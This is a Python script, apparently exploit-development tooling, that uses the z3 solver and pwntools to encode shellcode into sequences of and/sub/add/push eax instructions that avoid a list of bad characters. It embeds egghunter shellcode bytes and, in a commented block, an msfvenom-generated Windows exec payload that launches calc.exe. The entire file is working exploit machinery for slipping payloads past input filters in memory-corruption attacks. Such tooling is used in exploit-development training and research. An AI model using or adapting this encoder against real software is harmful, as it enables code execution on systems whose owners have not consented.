#!/usr/bin/env python

from z3 import *
from pwn import *
import sys


# egghunter shellcode
shellcode =  ""
shellcode += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
shellcode += "\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
shellcode += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

"""
# $ msfvenom -p windows/exec CMD="calc.exe" -f python -v shellcode
shellcode =  ""
shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += "\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += "\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += "\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += "\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += "\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += "\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += "\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += "\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += "\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += "\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += "\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
shellcode += "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
shellcode += "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
shellcode += "\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
shellcode += "\x63\x2e\x65\x78\x65\x00"
"""

# little-endian fill-up
shellcode = shellcode[::-1]

# extend the length to the multiple of 4
shellcode += "\x41"*(math.ceil(len(shellcode)/4)*4-len(shellcode))

# define the bad_chars here
bad_chars = [0x0a, 0x0d, 0x2F, 0x3A, 0x3F, 0x40, 0x50]

is_zerofied = True

def solve(leftover,target):
    global bad_chars
    global is_zerofied

    nozeros = {}
    zeros = {}
    result = [nozeros,zeros]
    leftovers = [leftover,0]

    for op in range(2):
        for ops in range(1,4):
            s = Solver()
            s.set("timeout",10000)
            var = []
            sign = []

            for i in range(ops):
                var.append(BitVecs('var_'+str(i),32)[0])
                sign.append(Int('sign_'+str(i)))

            for i in sign:
                s.add(Or(i==1,i==-1))

            for i in var:
                for k in range(0,32,8):
                    s.add(Extract(k+7, k, i) > BitVecVal(0x00, 8))
                    s.add(ULT(Extract(k+7, k, i),BitVecVal(0x80, 8)))
                    for c in bad_chars:
                        s.add(Extract(k+7, k, i) != BitVecVal(c, 8))
            func = lambda var,sign:var*Int2BV(sign,32)
            s.add(leftovers[op]+sum(list(map(func,var,sign)))==target)
            if s.check() == sat:
                #print("found!")
                #print(s.model())
                for i in s.model():
                    result[op][i.name()]=s.model()[i].as_long()
                break

    if len(zeros) == 0 and len(nozeros) == 0:
        return {}
    elif len(zeros) == 0:
        is_zerofied = False
        return nozeros
    elif len(nozeros) == 0:
        is_zerofied = True
        return zeros
    else:
        # without zeroing, need more than 2 operations than with zeroing 
        # then would rather zerofy first.
        if len(zeros)+2<len(nozeros):
            is_zerofied = True
            return zeros
        else:
            is_zerofied = False
            return nozeros


def zerofy():
    global bad_chars
    s = Solver()
    x,y = BitVecs('x y',32)
    var = [x,y]
    for i in var:
        for k in range(0,32,8):
            s.add(Extract(k+7,k,i) > BitVecVal(0x00,8))
            s.add(ULT(Extract(k+7, k, i),BitVecVal(0x80, 8)))
            for c in bad_chars:
                s.add(Extract(k+7, k, i) != BitVecVal(c, 8))
    s.add(x&y==0)
    if s.check() == sat:
        r = []
        for i in s.model():
            r.append(s.model()[i].as_long())
        return r
    return [0,0]


final = b""

# need "\x25" to perform `and` operation to zerofy eax
# need "\x50" to perform `push eax` operation to push the instruction onto the stack
if 0x25 in bad_chars or 0x50 in bad_chars:
    print("cannot be decoded!")
    sys.exit(0)

zero1,zero2 = zerofy()

if zero1==0 and zero2==0:
    print("cannot be decoded!")
    sys.exit(0)

print("and eax, 0x%08x" % zero1)
final += asm("and eax, 0x%08x" % zero1)
print("and eax, 0x%08x\n" % zero2)
final += asm("and eax, 0x%08x" % zero2)


leftover = 0

for i in range(int(len(shellcode)/4)):
    tmp = shellcode[i*4:i*4+4]
    target = int("0x"+''.join(str(hex(ord(j)))[2:].zfill(2) for j in tmp),16)
    #print("target is 0x%08x,leftover = 0x%08x" % (target,leftover))
    res = solve(leftover,target)
    if not res:
        print("cannot encode!")
        sys.exit(0)
    ops = int(len(res)/2)
    if is_zerofied:
        print("and eax, 0x%08x" % zero1)
        final += asm("and eax, 0x%08x" % zero1)
        print("and eax, 0x%08x" % zero2)
        final += asm("and eax, 0x%08x" % zero2)
    for i in range(ops):
        if res['sign_'+str(i)] == -1:
            print("sub eax, 0x%08x" % res['var_'+str(i)])
            final += asm("sub eax, 0x%08x" % res['var_'+str(i)])
        else:
            print("add eax, 0x%08x" % res['var_'+str(i)])
            final += asm("add eax, 0x%08x" % res['var_'+str(i)])
    print("push eax\n")
    final += asm("push eax")
    leftover = target
print(''.join("\\x%02x" % i for i in final))
